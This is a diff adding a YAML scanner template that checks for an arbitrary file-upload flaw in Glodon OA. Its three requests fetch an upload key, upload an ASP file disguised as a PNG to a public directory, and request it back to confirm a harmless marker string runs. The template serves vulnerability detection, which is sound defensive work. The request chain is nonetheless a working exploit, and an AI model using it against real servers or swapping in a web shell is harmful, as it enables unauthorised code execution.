@@ -1,0 +1,29 @@
+name: 广联达OA-GetAuthorizeKey-文件上传
+description: >-
+  文件上传
+alwaysExecute: false
+matchCount: 3
+rules:
+  - method: POST
+    path: /Services/FileService/UserFiles/GetAuthorizeKey.ashx
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    search: 'key:"(?P<key>[^"]+)"'
+    body: >-
+      cmd=&destDir=./sysinfo/&destFilename=Rscan.asp
+    expression:
+      status: 200
+  - method: POST
+    path: /Services/FileService/UserFiles/UserFilesUpload.ashx
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytCOFhbEjc3IfYaY5
+    body: "------WebKitFormBoundarytCOFhbEjc3IfYaY5\r\nContent-Disposition: form-data; name=\"key\"\r\n\r\n{{key}}\r\n------WebKitFormBoundarytCOFhbEjc3IfYaY5\r\nContent-Disposition: form-data; name=\"destDir\"\r\n\r\n./sysinfo/\r\n------WebKitFormBoundarytCOFhbEjc3IfYaY5\r\nContent-Disposition: form-data; name=\"destFilename\"\r\n\r\nRscan.asp\r\n------WebKitFormBoundarytCOFhbEjc3IfYaY5\r\nContent-Disposition: form-data; name=\"file\";filename=\"Rscan.asp\"\r\ncontent-type:image/png\r\n\r\n<% response.write(\"Rscan_test\")%>\r\n------WebKitFormBoundarytCOFhbEjc3IfYaY5--"
+    expression:
+      status: 200
+      body_all:
+        - "sysinfo"
+  - method: GET
+    path: /UserFiles/sysinfo/Rscan.asp
+    expression:
+      status: 200
+      body_all: ["Rscan_test"]
